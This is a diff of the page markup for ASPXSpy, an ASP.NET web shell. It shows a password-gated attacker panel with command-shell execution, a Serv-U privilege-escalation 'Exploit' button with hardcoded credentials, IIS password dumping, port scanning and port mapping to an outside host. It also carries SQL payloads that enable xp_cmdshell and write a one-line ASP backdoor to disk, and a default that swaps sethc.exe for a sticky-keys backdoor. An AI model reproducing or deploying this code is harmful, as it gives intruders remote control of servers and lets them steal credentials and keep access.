init,no_truncate;drop table [bin_cmd];">LogBackup</asp:ListItem><asp:ListItem Value="create table [bin_cmd]([cmd] [image]);declare @a sysname,@s nvarchar(4000)select @a=db_name(),@s=0x62696E backup database @a to disk=@s;insert into [bin_cmd](cmd)values('&lt;%execute(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t='c:\bin.asp' backup database @b to disk=@t WITH DIFFERENTIAL,FORMAT;drop table [bin_cmd];">DatabaseBackup</asp:ListItem><asp:ListItem>SA_Upfile</asp:ListItem><asp:ListItem>FileCopy</asp:ListItem></asp:DropDownList>
-	<asp:Button runat="server" ID="Bin_Button_Show" CssClass="bt" Text="Show Tables" OnClick="Bin_List_SelectedIndexChanged"/>
-	</div>
-	<table width="100%" border="0" cellpadding="0" cellspacing="0"><tr><td> Run SQL </td></tr><tr><td><textarea id="Bin_Textarea_Query" class="area" style="overflow:auto;" runat="server" rows="5" cols="100"></textarea></td></tr><tr><td>
-<asp:Button runat="server" ID="Bin_Button_Query" CssClass="bt" Text="Query" onclick="Bin_Button_Query_Click"/>
-<asp:Button runat="server" ID="Bin_Button_Export" CssClass="bt" Text="Export" onclick="Bin_Button_Export_Click" Visible="false" EnableViewState="false"/></td></tr></table>
 
-<div id="Bin_Div_saupfile" runat="server" visible="false" enableviewstate="false">
-    <table width="70%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
-			<tr align="center">
-			<td style="width:15%" align="left">UpFile : <input id="Bin_TextBox_SaFile" class="input" runat="server" type="file" style="height:22px" size="30"/></td>
-			<td style="width:30%" align="left">SavePath : <input id="Bin_TextBox_SavePath" class="input" runat="server" type="text" style="height:16px" size="30"/>&nbsp;&nbsp;&nbsp;&nbsp;<asp:Button
-                    ID="Bin_Button_SaUpfile" runat="server" CssClass="bt"
-                    onclick="Bin_Button_SaUpfile_Click" Text="Sa_UpFile" />
-                                            </td>
+<form id="ASPXSpy" runat="server">
 
-			</tr>
-			</table></div>
-			<div id="Bin_Div_CopyFile" runat="server" visible="false" enableviewstate="false">
-<table width="70%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
-<tr align="center">
-<td style="width:10%" align="left">Source : <input id="Bin_TextBox_Source" class="input" runat="server" type="text" style="height:16px" size="40" value="c:\windows\explorer.exe"/></td>
-<td style="width:20%" align="left">Target : <input id="Bin_TextBox_Target" class="input" runat="server" type="text" style="height:16px" size="40" value="c:\windows\system32\sethc.exe"/>&nbsp;&nbsp;&nbsp;&nbsp;<asp:Button runat="server"
-                    ID="Bin_Button_CabCopy" CssClass="bt" Text="CabCopy"
-        onclick="Bin_Button_CabCopy_Click"  />&nbsp;&nbsp;&nbsp;&nbsp;<asp:Button runat="server"
-                    ID="Bin_Button_FsoCopy" CssClass="bt" Text="FsoCopy"
-        onclick="Bin_Button_FsoCopy_Click"/></td>
-</tr>
-</table>
+<div id="ljtzC" runat="server" style=" margin:15px" enableviewstate="false" visible="false" >
+
+<span style="font:11px Verdana;">Password:</span>
+
+<asp:TextBox ID="HRJ" runat="server" Columns="20" CssClass="Bin_Style_Login" ></asp:TextBox>
+
+<asp:Button ID="ZSnXu" runat="server" Text="Login" CssClass="Bin_Style_Login" OnClick="xVm"/><p/>
+
+Copyright &copy; 2009 Bin -- <a href="http://www.rootkit.net.cn" target="_blank">www.rootkit.net.cn</a>
+
 </div>
-	<div style="overflow:auto;" >
-	<p>
-	<asp:DataGrid runat="server" ID="Bin_DataGrid" HeaderStyle-CssClass="head" BorderWidth="0" GridLines="None" EnableViewState="false"></asp:DataGrid>
-	</p>
-	</div>
-	</div>
-	</div>
-	<%--PortMap--%>
-	<div id="Bin_Div_PortMap" runat="server">
-		<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
-			<tr align="center">
-			<td style="width:5%"></td>
-			<td style="width:20%" align="left">Local Ip : <input class="input" runat="server" id="Bin_TextBox_Lip" type="text" size="20" value="127.0.0.1"/></td>
-			<td style="width:20%" align="left">Local Port : <input class="input" runat="server" id="Bin_TextBox_Lport" type="text" size="20" value="3389"/></td>
-			<td style="width:20%" align="left">Remote Ip : <input class="input" runat="server" id="Bin_TextBox_Rip" type="text" size="20" value="www.rootkit.net.cn"/></td>
-			<td style="width:20%" align="left">Remote Port : <input class="input" runat="server" id="Bin_TextBox_Rport" type="text" size="20" value="80"/></td></tr>
-			<tr align="center"><td colspan="5"><br/><asp:Button ID="Bin_Button_MapPort" CssClass="bt" runat="server" Text="Start" OnClick="Bin_Button_MapPort_Click"/><asp:Button ID="zcg_btnListPM" CssClass="bt" runat="server" Text="ListAll" OnClick="zcg_btnListPM_Click"/><asp:Button ID="zcg_btnClearPM" CssClass="bt" runat="server" Text="ClearAll" OnClick="zcg_btnClearPM_Click"/></td></tr></table>
-		<asp:Table ID="zcg_tbl_PMList" runat="server" Width="100%" CellSpacing="0" Visible=false>
-			<asp:TableRow CssClass="head"><asp:TableCell Width="20%">ID</asp:TableCell><asp:TableCell Width="20%">Remote</asp:TableCell><asp:TableCell Width="20%">Local</asp:TableCell><asp:TableCell Width="20%">Status</asp:TableCell><asp:TableCell Width="20%">Action</asp:TableCell></asp:TableRow>
-		</asp:Table>
-			</div>
-	<%--Search--%>
-	<div id="Bin_Div_Search" runat="server">
-		<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
-			<tr align="center">
-				<td style="width:20%" align="left">Keyword</td>
-				<td style="width:60%" align="left"><textarea id="Bin_TextArea_Search" runat="server" class="area" style="width:100%" rows="4"></textarea></td>
-				<td style="width:20%" align="left"><input type="checkbox" runat="server" id="Bin_Search_UseReg" value="1"/> Use Regex</td>
-			</tr>
-			<tr align="center">
-				<td style="width:20%" align="left">Replace As</td>
-				<td style="width:60%" align="left"><textarea id="Bin_TextArea_ReplaceAs" runat="server" class="area" style="width:100%" rows="4"></textarea></td>
-				<td style="width:20%" align="left"><input type="checkbox" runat="server" id="Bin_Search_Replace"/> Replace</td>
-			</tr>
-			<tr align="center">
-				<td style="width:20%" align="left">Search FileType</td>
-				<td style="width:60%" align="left"><input type="text" runat="server" class="input" id="Bin_Search_Ext" style="width:100%" value="asp|asa|cer|cdx|aspx|asax|ascx|cs|jsp|php|txt|inc|ini|js|htm|html|xml|config"/></td>
-				<td style="width:20%" align="left"><asp:DropDownList runat="server" ID="Bin_Search_Mod" AutoPostBack="False" CssClass="list"><asp:ListItem Value="name" Selected="True">File Name</asp:ListItem><asp:ListItem Value="content">File Content</asp:ListItem></asp:DropDownList></td>
-			</tr>
-			<tr align="center">
-				<td style="width:20%" align="left">Path</td>
-				<td style="width:60%" align="left"><input type="text" class="input" id="Bin_Search_Path" runat="server" style="width:100%" /></td>
-				<td style="width:20%" align="left"><asp:Button CssClass="bt" id="Bin_Button_SearchSubmit" runat="server" onclick="Bin_Button_Search_Click" Text="Start" /></td>
-			</tr>
-		</table>
-		<br/>
-		<br/>
-		<asp:Table ID="Bin_Table_Search" runat="server" Width="100%" CellSpacing="0" >
-			<asp:TableRow CssClass="head"><asp:TableCell Width="60%">File Path</asp:TableCell><asp:TableCell Width="20%">Last modified</asp:TableCell><asp:TableCell Width="20%">Size</asp:TableCell></asp:TableRow>
-		</asp:Table>
-	</div>
-	<%--WmiTools--%>
-	<div id="Bin_Div_WmiTools" runat="server">
-	<div id='zcg_divresize' style="width:1000px;overflow:auto">
-	<p>Computer:<asp:TextBox id="zcg_txbWmiComputer" style="width:8%;margin:0 8px; height:17px" CssClass="input" value="" runat="server"/>Username:<asp:TextBox id="zcg_txbWmiUserName" style="width:8%;margin:0 8px; height:17px" CssClass="input" value="" runat="server"/>Password:<asp:TextBox id="zcg_txbWmiPassword" style="width:8%;margin:0 8px; height:17px" CssClass="input" value="" runat="server"/>Namespace:<asp:TextBox id="zcg_txbWmiNamespace" style="width:8%;margin:0 8px; height:17px" CssClass="input" value="root\CIMV2" runat="server"/>QueryString : <asp:TextBox id="Bin_TextBox_WmiString" style="width:20%;margin:0 8px; height:17px" CssClass="input" runat="server" Text="select * from win32_process"/>&nbsp;<asp:Button ID="Bin_Button_WmiQuery" runat="server" Text="Query" CssClass="bt" onclick="Bin_Button_WmiQuery_Click"/></p></div>
-            <div id="Bin_Div_WmiPanel" runat="server">
-	            Result:<br />
-	<asp:DataGrid runat="server" ID="Bin_DataGrid_Wmi" HeaderStyle-CssClass="head" BorderWidth="0"
-                    GridLines="None"  EnableViewState="false"></asp:DataGrid>
-            </div>
-	</div>
-	<%--ADS Viewer--%>
-	<div id="zcg_div_ADSViewer" runat="server">
-	<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
+
+<div id="ZVS" runat="server">
+
+<div id="Zzj" runat="server">
+
+<table width="100%" border="0" cellpadding="0" cellspacing="0">
+
+<tr class="head">
+
+<td ><span style="float:right;"><a href="http://www.rootkit.net.cn" target="_blank">ASPXSpy Ver: 2009</a></span><span id="miansha2" runat="server" enableviewstate="true"></span></td>
+
+</tr>
+
+<tr class="alt1">
+
+<td><span style="float:right;" id="Bin_Span_FrameVersion" runat="server"></span>
+
+<asp:LinkButton ID="UtkN" runat="server" OnClick="YKpI" Text="Logout" ></asp:LinkButton> | <asp:LinkButton ID="RsqhW" runat="server" Text="File Manager" OnClick="Ybg"></asp:LinkButton> | <asp:LinkButton ID="xxzE" runat="server" Text="CmdShell" OnClick="VOxn"></asp:LinkButton> | <asp:LinkButton ID="nuc" runat="server" Text="IIS Spy" OnClick="KjPi"></asp:LinkButton> | <asp:LinkButton ID="OREpx" runat="server" Text="Process" OnClick="Grxk"></asp:LinkButton> | <asp:LinkButton ID="jHN" runat="server" Text="Services" OnClick="ilC"></asp:LinkButton> | <asp:LinkButton ID="PHq" runat="server" Text="UserInfo" OnClick="Olm"></asp:LinkButton> | <asp:LinkButton ID="wmgnK" runat="server" Text="SysInfo" OnClick="HtB"></asp:LinkButton> | <asp:LinkButton ID="FeV" runat="server" Text="FileSearch" OnClick="PPtK"></asp:LinkButton> | <asp:LinkButton ID="PVQ" runat="server" Text="SU Exp" OnClick="jXhS"></asp:LinkButton> | <asp:LinkButton ID="jNDb" runat="server" Text="RegShell" OnClick="xSy"></asp:LinkButton> | <asp:LinkButton ID="HDQ" runat="server" Text="PortScan" OnClick="cptS" ></asp:LinkButton> | <asp:LinkButton ID="AoI" runat="server" Text="DataBase" OnClick="dMx"></asp:LinkButton> | <asp:LinkButton ID="KHbEd" runat="server" Text="PortMap" OnClick="fDO"></asp:LinkButton>
+
+</td>
+
+</tr>
+
+</table>
+
+</div>
+
+<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
+
+<div id="jDKt" style="background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;" runat="server" visible="false" enableviewstate="false"></div>
+
+<h2 id="Bin_H2_Title" runat="server"></h2>
+
+<%--FileList--%>
+
+<div id="CzfO" runat="server">
+
+<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
+
  <tr>
-	<td style=" white-space:nowrap">Current Path:</td>
-	<td style=" width:40%"><input class="input" id="zcg_txbADSPath" type="text" style="width:95%;margin:0 8px;" runat="server"/>
-	</td>
-	<td style=" white-space:nowrap">Filter:</td>
-	<td style=" width:15%"><input class="input" id="zcg_txbADSFilter" type="text" style="width:85%;margin:0 8px;" runat="server"/>
-	</td>
-	<td style=" white-space:nowrap">UserName:</td>
-	<td style=" width:15%"><input class="input" id="zcg_txbADSUser" type="text" style="width:85%;margin:0 8px;" runat="server"/>
-	</td>
-	<td style=" white-space:nowrap">PassWord:</td>
-	<td style=" width:15%"><input class="input" id="zcg_txbADSPass" type="text" style="width:85%;margin:0 8px;" runat="server"/>
-	</td>
-	<td style=" white-space:nowrap">Type:</td>
-	<td style=" width:10%"><input class="input" id="zcg_txbADSType" Value="1" type="text" style="width:85%;margin:0 8px;" runat="server" onClick="show();" /><br/>
-	<div id="typediv" style="position:absolute;font-size:9pt; background-color:#e8e8e8;width:145px; display:none;z-index:9999;">
-	<input type="checkbox" name="checker" value="0">None</input><br/>
-	<input type="checkbox" name="checker" checked="true" value="1">Secure</input><br/>
-	<input type="checkbox" name="checker" value="2">SecureSocketsLayer</input><br/>
-	<input type="checkbox" name="checker" value="2">Encryption</input><br/>
-	<input type="checkbox" name="checker" value="4">ReadonlyServer</input><br/>
-	<input type="checkbox" name="checker" value="0x10">Anonymous</input><br/>
-	<input type="checkbox" name="checker" value="0x20">FastBind</input><br/>
-	<input type="checkbox" name="checker" value="0x40">Signing</input><br/>
-	<input type="checkbox" name="checker" value="0x80">Sealing</input><br/>
-	<input type="checkbox" name="checker" value="0x100">Delegation</input><br/>
-	<input type="checkbox" name="checker" value="0x200">ServerBind</input><br/>
-	<input type="button" onclick="hide(true)" style="width:50px;" value="OK"/>
-	<input type="button" onclick="hide(false)" style="margin-left:25px;" value="Cancel"/>
-	</div>
-	<script>
-	function show()
-	{
-	document.getElementById("typediv").style.display="block";return false;
-	}
-	function hide(isok)
-	{
-	if(isok)
-	{
-	var hidvalue=0;
-	var clicked=false;
-	var checkers=document.getElementsByName("checker");
-	for(var i=0;i<checkers.length;i++)
-	{
-	if(checkers[i].checked){hidvalue|=parseInt(checkers[i].value);clicked=true;}
-	}
-	document.getElementById("zcg_txbADSType").value=clicked?hidvalue:1;
-	}
-	document.getElementById("typediv").style.display="none";
-	return false;
-	}
-	</script>
-	</td>
-	<td style="white-space:nowrap" ><asp:Button ID="zcg_btnDoListADS" runat="server" Text="List" CssClass="bt" OnClick="zcg_btnDoListADS_Click"/></td>
+
+<td style=" white-space:nowrap">Current Directory : </td>
+
+<td style=" width:100%"><input class="input" id="AXSbb" type="text" style="width:97%;margin:0 8px;" runat="server"/>
+
+</td>
+
+<td style="white-space:nowrap" ><asp:Button ID="xaGwl" runat="server" Text="Go" CssClass="bt" OnClick="EXV"/></td>
+
  </tr>
-	</table>
-	<table width="100%" border="0" cellpadding="4" cellspacing="0">
-	<tr class="alt1"><td style="padding:5px;">
-	<div style="float:right;">Schema:<asp:Label id="zcg_lbl_Schema" Text="&nbsp;" runat="server" style=" height:22px,Width:50px"/></div>
-	<asp:LinkButton ID="zcg_lbtnADSWinNT" runat="server" Text="WinNT" CommandArgument="WinNT:" OnClick="zcg_lbtnADS_Click"></asp:LinkButton> |
-	<asp:LinkButton ID="zcg_lbtnADSLocalMachine" runat="server" Text="LocalMachine" CommandArgument="WinNT://"	OnClick="zcg_lbtnADS_Click"></asp:LinkButton> |
-	<asp:LinkButton ID="zcg_lbtnADSLocalShare" runat="server" Text="LocalShare" CommandArgument="WinNT://127.0.0.1/lanmanserver"	OnClick="zcg_lbtnADS_Click"></asp:LinkButton> |
-	<asp:LinkButton ID="zcg_lbtnADSWorkGroup" runat="server" Text="WorkGroup" CommandArgument="WinNT://WORKGROUP"	OnClick="zcg_lbtnADS_Click"></asp:LinkButton> |
-	<asp:LinkButton ID="zcg_lbtnADSCurrentDomain" runat="server" Text="CurrentDomain" CommandArgument="WinNT://"	OnClick="zcg_lbtnADS_Click"></asp:LinkButton> |
-	<asp:LinkButton ID="zcg_lbtnADSIIS" runat="server" Text="IIS" CommandArgument="IIS:" OnClick="zcg_lbtnADS_Click"></asp:LinkButton> |
-	<asp:LinkButton ID="zcg_lbtnADSW3SVC" runat="server" Text="W3SVC" CommandArgument="IIS://LOCALHOST/W3SVC" OnClick="zcg_lbtnADS_Click"></asp:LinkButton> |
-	<asp:LinkButton ID="zcg_lbtnADSLDAP" runat="server" Text="LDAP" CommandArgument="LDAP:" OnClick="zcg_lbtnADS_Click"></asp:LinkButton> |
-	<asp:LinkButton ID="zcg_lbtnADSLDAPRootDSE" runat="server" Text="LDAPRootDSE" CommandArgument="LDAP://RootDSE" OnClick="zcg_lbtnADS_Click"></asp:LinkButton>
-	</td></tr>
-		<asp:Table ID="zcg_tbl_ADSViewer" runat="server" Width="100%" CellSpacing="0" >
-			<asp:TableRow CssClass="head"><asp:TableCell Width="20%">Name</asp:TableCell><asp:TableCell Width="10%">Type</asp:TableCell><asp:TableCell Width="15%">Schema</asp:TableCell><asp:TableCell Width="15%">Value</asp:TableCell><asp:TableCell>Path</asp:TableCell></asp:TableRow>
-		</asp:Table>
-	</table>
-	</div>
-	<%--Plugin Loader--%>
-	<div id="zcg_div_Plugin" runat="server">
-	Select a File:<input id="zcg_plgFile" class="input" runat="server" type="file" style="height:22px"/><br/><br/><asp:CheckBox ID="zcg_chbIsDeflated" runat="server" Text="Deflate-Compressed"/>   <asp:CheckBox ID="zcg_chbIsHtml" runat="server" Text="HTML Result"/><br/><br/>TypeName:<br/><asp:TextBox ID="zcg_txbTypeName" runat="server" Size="55" Text="Zcg.Test.AspxSpyPlugins.TestPlugin"></asp:TextBox><br/><br/>MethodName:<br/><asp:TextBox ID="zcg_txbMethodName" runat="server" Size="55" Text="Test"></asp:TextBox><br/><br />Params:<br/><asp:TextBox ID="zcg_txbParams" runat="server" TextMode="1" Height="70" Columns="46"></asp:TextBox><br/><br/><asp:Button ID="zcg_btnplgLoad" CssClass="bt" runat="server" Text="LoadPlugin" OnClick="zcg_btnplgLoad_Click"/>
-	<div id="zcg_div_PluginResult" runat="server"></div>
-	</div>
-		</td></tr></table>
-		<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">Copyright(C)2006-2014 <a href="http://www.rootkit.net.cn" target="_blank">Bin'Blog</a> All Rights Reserved.</div></div>
-		<script>var tmpdiv=document.getElementById('zcg_divresize');var tmpwidth=document.getElementById('Bin_Div_Head').clientWidth+"px";if(tmpdiv){tmpdiv.style.width=tmpwidth;}</script>
-		</form>
-	</body>
-</html>
+
+</table>
+
+<table width="100%" border="0" cellpadding="4" cellspacing="0">
+
+<tr class="alt1"><td colspan="7" style="padding:5px;">
+
+<div style="float:right;"><input id="Fhq" class="input" runat="server" type="file" style=" height:22px"/>
+
+<asp:Button ID="RvPp" CssClass="bt" runat="server" Text="Upload" OnClick="lbjLD"/></div><asp:LinkButton ID="OLJFp" runat="server" Text="WebRoot" OnClick="mcCY"></asp:LinkButton> | <a href="#" id="Bin_Button_CreateDir" runat="server">Create Directory</a> | <a href="#" id="Bin_Button_CreateFile" runat="server">Create File</a>
+
+ | <span id="Bin_Span_Drv" runat="server"></span><a href="#" id="Bin_Button_KillMe" runat="server" style="color:Red">Kill Me</a>
+
+</td></tr>
+
+<asp:Table ID="UGzP" runat="server" Width="100%" CellSpacing="0" >
+
+<asp:TableRow CssClass="head"><asp:TableCell>&nbsp;</asp:TableCell><asp:TableCell>Filename</asp:TableCell><asp:TableCell Width="25%">Last modified</asp:TableCell><asp:TableCell Width="15%">Size</asp:TableCell><asp:TableCell Width="25%">Action</asp:TableCell></asp:TableRow>
+
+</asp:Table>
+
+</table>
+
+</div>
+
+<%--FileEdit--%>
+
+<div id="vrFA" runat="server">
+
+<p>Current File(import new file name and new file)<br/>
+
+<input class="input" id="Sqon" type="text" size="100" runat="server"/> <asp:DropDownList ID="NdCX" runat="server" CssClass="list" AutoPostBack="true" OnSelectedIndexChanged="zOVO"><asp:ListItem>Default</asp:ListItem><asp:ListItem>UTF-8</asp:ListItem></asp:DropDownList>
+
+</p>
+
+<p>File Content<br/>
+
+<textarea id="Xgvv" runat="server" class="area" cols="100" rows="25" enableviewstate="true" ></textarea>
+
+</p>
+
+<p><asp:Button ID="JJjbW" runat="server" Text="Submit" CssClass="bt" OnClick="DGCoW"/> <asp:Button ID="iCNu" runat="server" Text="Back" CssClass="bt" OnClick="IkkO"/></p>
+
+</div>
+
+<%--CloneTime--%>
+
+<div id="zRyG" runat="server" enableviewstate="false" visible="false">
+
+<p>Alter file<br/><input class="input" id="QiFB" type="text" size="120" runat="server"/></p>
+
+<p>Reference file(fullpath)<br/><input class="input" id="lICp" type="text" size="120" runat="server"/></p>
+
+<p><asp:Button ID="JEaxV" runat="server" Text="Submit" CssClass="bt" OnClick="XXrLw"/></p>
+
+<h2>Set last modified &raquo;</h2>
+
+<p>Current file(fullpath)<br/><input class="input" id="pWVL" type="text" size="120" runat="server"/></p>
+
+<p>
+
+<asp:CheckBox ID="ZhWSK" runat="server" Text="ReadOnly" EnableViewState="False"/>
+
+&nbsp;
+
+<asp:CheckBox ID="SsR" runat="server" Text="System" EnableViewState="False"/>
+
+&nbsp;
+
+<asp:CheckBox ID="ccB" runat="server" Text="Hidden" EnableViewState="False"/>
+
+&nbsp;
+
+<asp:CheckBox ID="fbyZ" runat="server" Text="Archive" EnableViewState="False"/>
+
+</p>
+
+<p>
+
+CreationTime :
+
+<input class="input" id="yUqx" type="text" runat="server"/>
+
+LastWriteTime :
+
+<input class="input" id="uYjw" type="text" runat="server"/>
+
+LastAccessTime :
+
+<input class="input" id="aLsn" type="text" runat="server"/>
+
+</p>
+
+<p>
+
+<asp:Button ID="kOG" CssClass="bt" runat="server" Text="Submit" OnClick="tIykC"/>
+
+</p>
+
+</div>
+
+<%--IISSpy--%>
+
+<div runat="server" id="VNR" visible="false" enableviewstate="false">
+
+<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
+
+<asp:Table ID="GlI" runat="server" Width="100%" CellSpacing="0">
+
+<asp:TableRow CssClass="head"><asp:TableCell>ID</asp:TableCell><asp:TableCell>IIS_USER</asp:TableCell><asp:TableCell>IIS_PASS</asp:TableCell><asp:TableCell>Domain</asp:TableCell><asp:TableCell>Path</asp:TableCell></asp:TableRow>
+
+</asp:Table>
+
+</table>
+
+</div>
+
+<%--Process--%>
+
+<div runat="server" id="DCbS" visible="false" enableviewstate="false">
+
+<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
+
+<asp:Table ID="IjsL" runat="server" Width="100%" CellSpacing="0" >
+
+<asp:TableRow CssClass="head"><asp:TableCell></asp:TableCell><asp:TableCell>ID</asp:TableCell><asp:TableCell>Process</asp:TableCell><asp:TableCell>ThreadCount</asp:TableCell><asp:TableCell>Priority</asp:TableCell><asp:TableCell>Action</asp:TableCell></asp:TableRow>
+
+</asp:Table>
+
+</table>
+
+</div>
+
+<%--CmdShell--%>
+
+<div runat="server" id="vIac">
+
+ <p>CmdPath:<br/>
+
+ <input class="input" runat="server" id="kusi" type="text" size="100" value="c:\windows\system32\cmd.exe"/>
+
+ </p>
+
+ Argument:<br/>
+
+ <input class="input" runat="server" id="bkcm" value="/c Set" type="text" size="100"/> <asp:Button ID="YrqL" CssClass="bt" runat="server" Text="Submit" OnClick="FbhN"/>
+
+ <div id="tnQRF" runat="server" visible="false" enableviewstate="false">
+
+ </div>
+
+</div>
+
+<%--Services--%>
+
+<div runat="server" id="iQxm" visible ="false" enableviewstate="false">
+
+<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
+
+<asp:Table ID="vHCs" runat="server" Width="100%" CellSpacing="0" >
+
+<asp:TableRow CssClass="head"><asp:TableCell></asp:TableCell><asp:TableCell>ID</asp:TableCell><asp:TableCell>Name</asp:TableCell><asp:TableCell>Path</asp:TableCell><asp:TableCell>State</asp:TableCell><asp:TableCell>StartMode</asp:TableCell></asp:TableRow>
+
+</asp:Table>
+
+</table>
+
+</div>
+
+<%--Sysinfo--%>
+
+<div runat="server" id="ghaB" visible="false" enableviewstate="false">
+
+<hr style=" border: 1px solid #ddd;height:0px;"/>
+
+<ul class="info" id="Bin_Ul_Sys" runat="server"></ul>
+
+<h2 id="Bin_H2_Mac" runat="server"></h2>
+
+<hr style=" border: 1px solid #ddd;height:0px;"/>
+
+<ul class="info" id ="Bin_Ul_NetConfig" runat="server"></ul>
+
+<h2 id="Bin_H2_Driver" runat="server"></h2>
+
+<hr style=" border: 1px solid #ddd;height:0px;"/>
+
+<ul class="info" id ="Bin_Ul_Driver" runat="server"></ul>
+
+</div>
+
+<%--UserInfo--%>
+
+<div runat="server" id="xWVQ" visible="false" enableviewstate="false">
+
+<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
+
+<asp:Table ID="VPa" runat="server" Width="100%" CellSpacing="0" >
+
+</asp:Table>
+
+</table>
+
+</div>
+
+<%--SuExp--%>
+
+ <div runat="server" id="APl">
+
+<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
+
+ <tr align="center">
+
+ <td style="width:10%"></td>
+
+ <td style="width:20%" align="left">UserName : <input class="input" runat="server" id="dNohJ" type="text" size="20" value="localadministrator"/></td>
+
+ <td style="width:20%" align="left">PassWord : <input class="input" runat="server" id="NMd" type="text" size="20" value="#l@$ak#.lk;0@P"/></td>
+
+ <td style="width:20%" align="left">Port : <input class="input" runat="server" id="HlQl" type="text" size="20" value="43958"/></td>
+
+ <td style="width:10%"></td>
+
+ </tr>
+
+ <tr >
+
+ <td style="width:10%"></td>
+
+ <td colspan="5">CmdShell&nbsp;&nbsp;:&nbsp;<input class="input" runat="server" id="mHbjB" type="text" size="100" value="cmd.exe /c net user"/> <asp:Button ID="SPhc" CssClass="bt" runat="server" Text="Exploit" OnClick="lRfRj"/></td>
+
+ </tr>
+
+</table>
+
+<div id="UHlA" visible="false" enableviewstate="false" runat="server">
+
+<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
+
+<tr align="center">
+
+<td style="width:30%"></td>
+
+<td align="left" style="width:40%"><pre id="Bin_Td_Res" runat="server"></pre></td>
+
+<td style="width:30%"></td>
+
+</tr>
+
+</table>
+
+</div>
+
+</div>
+
+<%--Reg--%>
+
+<div id="kkHN" runat="server">
+
+<p>Registry Path : <asp:TextBox id="qPdI" style="width:85%;margin:0 8px;" CssClass="input" runat="server"/><asp:Button ID="MoNA" runat="server" Text="Go" CssClass="bt" onclick="RAFL"/></p>
+
+<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
+
+<asp:Table ID="pLWD" runat="server" Width="100%" CellSpacing="0" >
+
+<asp:TableRow CssClass="alt1"><asp:TableCell ColumnSpan="2" id="vyX"></asp:TableCell></asp:TableRow>
+
+<asp:TableRow CssClass="head"><asp:TableCell Width="40%">Key</asp:TableCell><asp:TableCell Width="60%">Value</asp:TableCell></asp:TableRow>
+
+</asp:Table>
+
+</table>
+
+</div>
+
+<%--PortScan--%>
+
+<div id="YwLB" runat="server">
+
+<p>
+
+IP : <asp:TextBox id="MdR" style="width:10%;margin:0 8px;" CssClass="input" runat="server" Text="127.0.0.1"/> Port : <asp:TextBox id="lOmX" style="width:40%;margin:0 8px;" CssClass="input" runat="server" Text="21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500"/> <asp:Button ID="CmUCh" runat="server" Text="Scan" CssClass="bt" OnClick="ELkQ"/>
+
+</p>
+
+<div id="GBYT" runat="server" visible="false" enableviewstate="false"></div>
+
+</div>
+
+<%--DataBase--%>
+
+<div id="iDgmL" runat="server">
+
+<p>ConnString : <asp:TextBox id="MasR" style="width:70%;margin:0 8px;" CssClass="input" runat="server"/><asp:DropDownList runat="server" CssClass="list" ID="WYmo" AutoPostBack="True" OnSelectedIndexChanged="zOVO" ><asp:ListItem></asp:ListItem><asp:ListItem Value="server=localhost;UID=sa;PWD=;database=master;Provider=SQLOLEDB">MSSQL</asp:ListItem><asp:ListItem Value="Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\database.mdb">ACCESS</asp:ListItem></asp:DropDownList><asp:Button ID="QcZPA" runat="server" Text="Go" CssClass="bt" OnClick="BGY"/></p>
+
+<div id="dQIIF" runat="server">
+
+<div id="irTU" runat="server"></div>
+
+<div id="uXevN" runat="server">
+
+Please select a database : <asp:DropDownList runat="server" ID="Pvf" AutoPostBack="True" OnSelectedIndexChanged="zOVO" CssClass="list"></asp:DropDownList>
+
+SQLExec : <asp:DropDownList runat="server" ID="FGEy" AutoPostBack="True" OnSelectedIndexChanged="zOVO" CssClass="list"><asp:ListItem Value="">-- SQL Server Exec --</asp:ListItem><asp:ListItem Value="Use master dbcc addextendedproc('xp_cmdshell','xplog70.dll')">Add xp_cmdshell</asp:ListItem><asp:ListItem Value="Use master dbcc addextendedproc('sp_OACreate','odsole70.dll')">Add sp_oacreate</asp:ListItem><asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;">Add xp_cmdshell(SQL2005)</asp:ListItem><asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;">Add sp_oacreate(SQL2005)</asp:ListItem><asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Web Assistant Procedures',1;RECONFIGURE;">Add makewebtask(SQL2005)</asp:ListItem><asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;">Add openrowset/opendatasource(SQL2005)</asp:ListItem><asp:ListItem Value="Exec master.dbo.xp_cmdshell 'net user'">XP_cmdshell exec</asp:ListItem><asp:ListItem Value="EXEC MASTER..XP_dirtree 'c:\',1,1">XP_dirtree</asp:ListItem><asp:ListItem Value="Declare @s int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^>>c:\bin.asp';">SP_oamethod exec</asp:ListItem><asp:ListItem Value="sp_makewebtask @outputfile='c:\bin.asp',@charset=gb2312,@query='select ''&lt;%execute(request(chr(35)))%&gt;'''">SP_makewebtask make file</asp:ListItem><asp:ListItem Value="exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1;select * from 